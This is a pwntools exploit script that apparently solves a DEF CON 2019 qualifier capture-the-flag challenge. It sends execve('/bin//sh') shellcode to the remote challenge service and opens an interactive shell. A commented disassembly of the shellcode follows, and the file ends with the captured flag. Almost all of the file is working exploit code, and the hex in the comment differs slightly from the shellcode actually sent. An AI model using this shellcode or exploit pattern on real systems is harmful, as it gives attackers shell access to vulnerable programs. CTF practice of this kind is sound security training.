from pwn import *

r = remote("speedrun-003.quals2019.oooverflow.io", 31337)
r.recvuntil("Send me your drift")

shellcode = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\x50\x50\x50\x50\x50\x5f"

r.sendline(shellcode)
r.interactive()

'''
Disassembly of section .text:

0000000000400080 <_start>:
  400080:	50                   	push   %rax
  400081:	48 31 d2             	xor    %rdx,%rdx
  400084:	48 31 f6             	xor    %rsi,%rsi
  400087:	48 bb 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rbx
  40008e:	2f 73 68 
  400091:	53                   	push   %rbx
  400092:	54                   	push   %rsp
  400093:	5f                   	pop    %rdi
  400094:	b0 3b                	mov    $0x3b,%al
  400096:	0f 05                	syscall

  \x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f + \x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05\x05\x50\x50\x50\x50\x50\x5f
'''

#OOO{Fifty percent of something is better than a hundred percent of nothing. (except when it comes to pwning)}